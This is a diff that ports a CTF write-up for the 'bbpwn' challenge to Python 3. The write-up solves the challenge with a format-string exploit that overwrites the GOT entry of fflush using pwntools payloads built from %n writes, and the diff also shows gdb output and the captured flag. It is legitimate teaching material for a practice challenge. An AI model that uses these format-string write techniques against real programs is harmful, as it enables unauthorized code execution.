@@ -1,5 +1,7 @@
 # Backdoorctf 17 bbpwn
 
+This was done on `Ubuntu 20.04.4 LTS`.
+
 Let's take a look at the binary:
 
 ```
@@ -89,6 +91,7 @@ $    objdump -R 32_new | grep fflush
 With the second write, we will write the second and third. The fourth write will write the highest byte of the address. However we will get around the fact that subsequent writes can only be greater than or equal to the previous write by overflowing the next spot in memory with it. So whatever value we write for the third write, only the least significant byte will end up in the highest byte for the got entry for `fflush`. To make more sense, let's look at the memory layout of the got entry while we carry out this attack. For that here's a small sample script which will carry out the attack and drop us in gdb to see:
 
 ```
+$   cat sample.py 
 #Import pwntools
 from pwn import *
 
@@ -98,8 +101,10 @@ target = process('./32_new')
 #Attach gdb if it is a process
 gdb.attach(target, gdbscript='b *0x080487dc')
 
+input()
+
 #Print the first line of text
-print target.recvline()
+print(target.recvline())
 
 #Establish the addresses which we will be writing to
 fflush_adr0 = p32(0x804a028)
@@ -107,9 +112,9 @@ fflush_adr1 = p32(0x804a029)
 fflush_adr2 = p32(0x804a02b)
 
 #Establish the necessary inputs for our input, so we can write to the addresses
-fmt_string0 = "%10$n"
-fmt_string1 = "%11$n"
-fmt_string2 = "%12$n"
+fmt_string0 = b"%10$n"
+fmt_string1 = b"%11$n"
+fmt_string2 = b"%12$n"
 
 #Form the payload
 payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fmt_string0 + fmt_string1 + fmt_string2
@@ -121,7 +126,7 @@ target.sendline(payload)
 target.interactive()
 ```
 
-When we run the script and check the memory layout in gdb, we see this:
+When we run the script and check the memory layout in gdb, we see this (we do need to give the input to the `sample.py`, for buffering):
 
 ```
 ─────────────────────────────────────────────────────────────── code:x86:32 ────
@@ -175,7 +180,7 @@ target = process('./32_new')
 #gdb.attach(target, gdbscript='b *0x080487dc')
 
 #Print the first line of text
-print target.recvline()
+print(target.recvline())
 
 #Prompt for input, to pause for gdb
 #raw_input()
@@ -186,14 +191,14 @@ fflush_adr1 = p32(0x804a029)
 fflush_adr2 = p32(0x804a02b)
 
 #Establish the amount of bytes needed to be printed in order to write correct value
-flag_val0 = "%185x"
-flag_val1 = "%892x"
-flag_val2 = "%129x"
+flag_val0 = b"%185x"
+flag_val1 = b"%892x"
+flag_val2 = b"%129x"
 
 #Establish the necessary inputs for our input, so we can write to the addresses
-fmt_string0 = "%10$n"
-fmt_string1 = "%11$n"
-fmt_string2 = "%12$n"
+fmt_string0 = b"%10$n"
+fmt_string1 = b"%11$n"
+fmt_string2 = b"%12$n"
 
 #Form the payload
 payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + flag_val0 + fmt_string0 + flag_val1 + fmt_string1 + flag_val2 + fmt_string2
@@ -208,15 +213,16 @@ target.interactive()
 When we run it:
 
 ```
-$    python exploit.py
-[+] Starting local process './32_new': pid 31622
-Hello baby pwner, whats your name?
-
+$    python3 exploit.py 
+[+] Starting local process './32_new': pid 60110
+b'Hello baby pwner, whats your name?\n'
 [*] Switching to interactive mode
-Ok cool, soon we will know whether you pwned it or not. Till then Bye (\xa0\x0)\xa0\x0+\xa0\x0                                                                                                                                                                                  8048914                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ffaa8f08                                                                                                                         ffaa8f5c
-[*] Process './32_new' stopped with exit code 1 (pid 31622)
+Ok cool, soon we will know whether you pwned it or not. Till then Bye (\xa0\x04)\xa0\x04+\xa0\x04                                                                                                                                                                                  8048914                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ffae34e8                                                                                                                         f7f84d50
+[*] Process './32_new' stopped with exit code 1 (pid 60110)
 flag{g0ttem_b0yz}
 [*] Got EOF while reading in interactive
+$ 
+[*] Interrupted
 ```
 
 Just like that, we solved the challenge!
